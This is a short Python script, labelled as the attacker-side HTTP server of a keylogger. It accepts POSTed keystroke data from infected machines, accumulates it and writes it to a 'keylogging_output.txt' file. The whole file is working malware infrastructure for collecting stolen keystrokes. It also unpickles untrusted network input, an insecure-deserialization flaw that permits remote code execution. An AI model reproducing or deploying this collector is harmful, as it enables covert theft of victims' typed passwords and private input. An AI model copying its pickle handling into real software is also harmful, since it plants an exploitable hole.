# Simple HTTP server on the attacker side
from http.server import BaseHTTPRequestHandler, HTTPServer
import ast
import pickle
from analytics import input_filter


keys = []
class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()

        message = "Hello, World! Here is a GET response"
        self.wfile.write(bytes(message, "utf8"))
    def do_POST(self):
        global keys
        content_length = int(self.headers['Content-Length'])
        raw = self.rfile.read(content_length)
        data = list(pickle.loads(ast.literal_eval(raw.decode())))
        keys += data

with HTTPServer(('', 9999), handler) as server:
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        with open("keylogging_output.txt", 'a') as file:
            file.write(input_filter(keys))



